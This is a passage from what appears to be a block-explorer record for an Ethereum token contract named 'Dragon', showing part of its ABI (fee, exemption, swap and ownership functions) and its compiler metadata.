ddresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"manageExcludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketWallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minPeriod\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minimumTokensBeforeSwapAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"resetLPRewardLastSendTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setDividExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setMarketPairStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMaxOnceNum\",\"type\":\"uint256\"}],\"name\":\"setMaxOnceNum\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMaxTotalNum\",\"type\":\"uint256\"}],\"name\":\"setMaxTotalNum\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"number\",\"type\":\"uint256\"}],\"name\":\"setMinPeriod\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setNumTokensBeforeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"setSwapAndLiquifyEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setisExcludedFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setisMaxNumExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setisOnceNumExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"a\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"b\",\"type\":\"uint256\"}],\"name\":\"smallOrEqual\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAndLiquifyBySmallOnly\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAndLiquifyEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"waiveOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Dragon", "CompilerVersion": "v0.8.4+commit.c7e474f2", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6d8c4d01eec61b6d7ffa72f1f419ac44e6d8741af4f8f157665086d3556ccaa4"}